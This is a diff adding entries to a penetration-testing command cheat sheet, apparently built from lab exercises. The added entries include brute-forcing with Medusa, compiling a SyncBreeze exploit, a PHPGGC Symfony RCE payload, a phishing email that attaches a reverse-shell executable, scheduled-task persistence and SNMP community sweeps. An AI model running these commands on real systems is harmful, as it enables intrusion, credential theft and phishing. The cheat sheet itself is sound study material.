@@ -1357,6 +1357,15 @@ cd cheatsheet-pentesting
   ```
 ---
 ### Medusa
+- **Run Medusa without specific targets for a basic usage example**:
+  ```bash
+  medusa -d
+  ```
+
+- **Perform a brute-force attack against a web service on the target IP**:
+  ```bash
+  medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
+  ```
 - **Brute Force Login for FTP**:
   ```bash
   medusa -h <host> -u <username> -P <password_list> -M ftp
@@ -1378,14 +1387,23 @@ cd cheatsheet-pentesting
   mimikatz "privilege::debug" "sekurlsa::logonpasswords" > credentials.txt
 ---  
 ### MinGW-64
-- **Compile a C Program**:
+- **Install the mingw-w64 cross-compiler in Kali Linux for building Windows binaries**:
   ```bash
-  x86_64-w64-mingw32-gcc <source_file>.c -o <output_file>.exe
+  sudo apt install mingw-w64
   ```
 
 - **Compile with Debug Symbols**:
   ```bash
   x86_64-w64-mingw32-gcc -g <source_file>.c -o <output_file>.exe
+  ```
+- **Compile a C Program**:
+  ```bash
+  x86_64-w64-mingw32-gcc <source_file>.c -o <output_file>.exe
+  ```
+
+- **Compile a code for Windows (32-bit) by linking the Winsock library (ws2_32)**:
+  ```bash
+  i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
   ```
 ---
 ### Mklink
@@ -1413,6 +1431,10 @@ cd cheatsheet-pentesting
 - **Subscribe with Authentication**:
   ```bash
   mosquitto_sub -h <broker_address> -u <username> -P <password> -t <topic>
+  ```
+- **Subscribe to the MQTT broker at 172.16.201.50 to retrieve messages from the 'important' topic**:
+  ```bash
+  mosquitto_sub -h 172.16.201.50 -u tester -P password -t important
   ```
 ---
 ### Mount
@@ -1470,9 +1492,17 @@ cd cheatsheet-pentesting
   ```
 ---
 ### Nessus
+- **Verifying the integrity of the downloaded Nessus package by checking its SHA-256 checksum and installing it**:
+  ```bash
+  sha256sum Nessus-X.X.X.deb
+  sudo apt install ./Nessus-X.X.X.deb
+  
+  ```
+
 - **Start Nessus Service**:
   ```bash
   systemctl start nessusd
+  sudo /etc/init.d/nessusd start
   ```
 
 - **Check Nessus Status**:
@@ -1539,6 +1569,14 @@ cd cheatsheet-pentesting
   ```bash
   onesixtyone -s <community_string> <IP_range>
   ```
+- **Create a file named 'community' containing SNMP community strings, generate IP addresses and Use the onesixtyone tool to scan the IPs**:
+  ```bash
+  echo public > community
+  echo private >> community
+  echo manager >> community
+  for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips
+  onesixtyone -c community -i ips
+  ```
 ---
 ### OpenSSL
 - **Generate a Private Key**:
@@ -1549,6 +1587,10 @@ cd cheatsheet-pentesting
 - **Create a Self-Signed Certificate**:
   ```bash
   openssl req -x509 -new -key private.key -out cert.pem -days 365
+  ```
+- ** Generate a hashed password using OpenSSL and a custom salt for user authentication**:
+  ```bash
+  openssl passwd -1 -salt test pass123
   ```
 ---
 ### Passwd
@@ -1561,6 +1603,15 @@ cd cheatsheet-pentesting
   ```bash
   sudo passwd <username>
   ```
+- **Check the status of the user 'tester' (e.g., account locked, password status, etc.)**:
+  ```bash
+  passwd --status tester
+  ```
+
+- **Display password aging and account expiration information for the user 'tester'**:
+  ```bash
+  chage -l jane
+  ```
 ---
 ### PHPGGC
 - **Generate a PHP Gadget Chain**:
@@ -1571,6 +1622,10 @@ cd cheatsheet-pentesting
 - **List Available Gadget Chains**:
   ```bash
   phpggc -l
+  ```
+- ** Generate a PHP payload using PHPGGC for Symfony Remote Code Execution (RCE4) to execute a command**:
+  ```bash
+  phpggc Symfony/RCE4 exec 'cat /home/tester/secret.txt' | base64
   ```
 ---
 ### Plink
@@ -1679,9 +1734,24 @@ cd cheatsheet-pentesting
   ```
 
 ### Rinetd
+- ** Update package lists and install rinetd from the Kali Linux repositories**:
+  ```bash
+  sudo apt update && sudo apt install rinetd
+  ```
+
 - **Add Port Forwarding Rule**:
   ```bash
   echo "<bind_ip> <bind_port> <target_ip> <target_port>" >> /etc/rinetd.conf
+  ```
+- **Add a port forwarding rule to the rinetd configuration file (/etc/rinetd.conf)**:
+  ```bash
+  cat /etc/rinetd.conf
+  0.0.0.0 80 216.58.207.142 80
+  ```
+
+- **Restart Rinetd**:
+  ```bash
+  systemctl restart rinetd
   ```
 
 - **Restart Rinetd**:
@@ -1754,6 +1824,22 @@ cd cheatsheet-pentesting
   ```cmd
   schtasks /delete /tn <task_name>
   ```
+- **Create a scheduled task named "runme" to run the program "C:\runme.exe" every Monday at 9:00 AM**:
+  ```cmd
+  schtasks /create /sc weekly /d mon /tn runme /tr C:\runme.exe /st 09:00
+  ```
+- **Delete the scheduled task named "runme"**:
+  ```cmd
+  schtasks /delete /tn runme
+  ```
+- **Recreate the scheduled task named "runme" with the same configuration (weekly, every Monday, 9:00 AM)**:
+  ```cmd
+  schtasks /create /sc weekly /d mon /tn runme /tr C:\runme.exe /st 09:00
+  ```
+- ** Query details of the scheduled task named "runme" and display the output in list format**:
+  ```cmd
+  schtasks /query /TN runme /fo LIST
+  ```
 
 ### SCP
 - **Copy a File to a Remote Server**:
@@ -1775,7 +1861,13 @@ cd cheatsheet-pentesting
 - **Print Specific Lines**:
   ```bash
   sed -n '<line_number>p' <file>
+  ```
   
+- **Update the UID in the /etc/passwd file**:
+  ```bash
+  sudo sed -i -e 's/1001/1014/g' /etc/passwd
+  ```
+  This command replaces all occurrences of the UID '1001' with '1014' in the /etc/passwd file.
 ### SendEmail
 - **Send an Email**:
   ```bash
@@ -1785,6 +1877,10 @@ cd cheatsheet-pentesting
 - **Attach a File**:
   ```bash
   sendEmail -f <from_address> -t <to_address> -u <subject> -m <message> -s <smtp_server> -a <file_path>
+  ```
+- **Send an email with an attachment using the sendEmail tool**:
+  ```bash
+  sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.177.55 -u "Important urgent patch Upgrade Instructions" -a /tmp/windows_reverse.exe
   ```
 
 ### SharpHound
@@ -1849,9 +1945,9 @@ cd cheatsheet-pentesting
   ```
 
 ### Spose
-- **Find File Paths**:
+- **Running Spose to check for open ports behind the proxy**:
   ```bash
-  spose <file_name>
+  python3 spose.py --proxy http://192.168.120.223:3128 --target 127.0.0.1
   ```
 
 ### Sqlmap
@@ -1888,9 +1984,10 @@ cd cheatsheet-pentesting
   steghide embed -cf <cover_file> -ef <embed_file>
   ```
 
-- **Extract Data from a File**:
+- **Extract hidden data from a JPG image using Steghide**:
   ```bash
   steghide extract -sf <stego_file>
+  steghide --extract -sf trytofind.jpg
   ```
 
 ### SVN
@@ -1903,6 +2000,19 @@ cd cheatsheet-pentesting
   ```bash
   svn commit -m "<message>"
   ```
+- **View the commit logs of the SVN repository with the provided username and password**:
+  ```bash
+  svn log --username admin --password admin http://192.168.120.73/svn/dev/
+  ```
+
+- **Compare the current revision (3) to the first revision (1) in the SVN repository**:
+  ```bash
+  svn diff -r 3:1 --username admin --password admin http://192.168.120.73/svn/dev/
+  ```
+- **Compare the current revision (3) to the second revision (2) in the SVN repository**:
+  ```bash
+  svn diff -r 3:2 --username admin --password admin http://192.168.120.73/svn/dev/
+  ```
 
 ### Tail
 - **View the End of a File**:
@@ -1914,6 +2024,12 @@ cd cheatsheet-pentesting
   ```bash
   tail -f <file>
   ```
+- **Monitor Apache access log in real-time using tail**:
+  ```bash
+  sudo tail -f /var/log/apache2/access.log
+  ```
+
+
 
 ### Tar
 - **Create a Tar Archive**:
@@ -1937,6 +2053,19 @@ cd cheatsheet-pentesting
 - **Filter by Name**:
   ```cmd
   tasklist /FI "IMAGENAME eq <process_name>"
+  ```
+- **Display all running processes along with their services**:
+  ```cmd
+  tasklist /svc
+  ```
+
+- **Display running processes by the SYSTEM account that are currently active**:
+  ```cmd
+  tasklist /fi "USERNAME eq NT AUTHORITY\SYSTEM" /fi "STATUS eq running"
+  ```
+- ** Filter to display processes with the name 'cmd.exe'**:
+  ```cmd
+  tasklist /fi "imagename eq cmd.exe"  # View processes named 'cmd.exe'
   ```
 
 ### Terminal
@@ -2028,7 +2157,10 @@ cd cheatsheet-pentesting
   ```bash
   watch -d <command>
   ```
-
+- **Monitor system resource usage with 'w' command, refreshing every 5 seconds**:
+  ```bash
+  watch -n 5 w
+  ```
 - ** Continuously monitor the status of files in a directory (ignoring certain paths) every second, highlighting differences**:
   ```bash
   watch -n 1 -d "find . -! -path './hooks/*' -! -path './info/*' | sort"
